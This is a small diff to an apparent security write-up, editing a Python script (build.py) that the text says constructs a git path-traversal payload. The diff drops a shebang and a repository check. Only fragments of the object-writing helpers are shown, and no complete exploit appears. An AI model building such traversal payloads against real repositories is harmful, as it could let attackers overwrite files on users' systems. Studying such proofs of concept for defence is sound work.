@@ -386,8 +386,6 @@ $ touch README.md
 ```
 We use the following script ( build.py ) to construct the traversal payload:
 ```python
-#!/usr/bin/env python3
-
 import hashlib
 import zlib
 import os
@@ -415,10 +413,6 @@ def write_obj(data, t):
 def entry(mode, name, sha):
     return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)
 
-
-if not os.path.isdir(".git"):
-    print("Run inside git repo")
-    sys.exit(1)
 
 
 r = subprocess.run(
